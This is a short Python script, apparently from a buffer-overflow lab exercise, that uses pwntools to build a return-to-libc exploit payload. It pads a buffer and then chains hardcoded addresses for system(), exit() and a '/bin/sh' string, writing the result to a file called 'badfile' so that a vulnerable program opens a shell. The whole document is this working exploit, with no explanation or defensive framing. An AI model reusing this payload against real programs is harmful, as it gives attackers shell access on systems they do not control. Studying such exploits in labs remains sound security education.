from pwn import *


offset = 0x14+4
sys_addr = 0xb7e42da0
exit_addr = 0xb7e369d0
#print hex(sys_addr),hex(exit_addr)
binsh_addr = 0xbffffe16

payload = 'a'*offset + p32(sys_addr) + p32(exit_addr) + p32(binsh_addr)

with open('badfile','w') as f:
	f.write(payload)
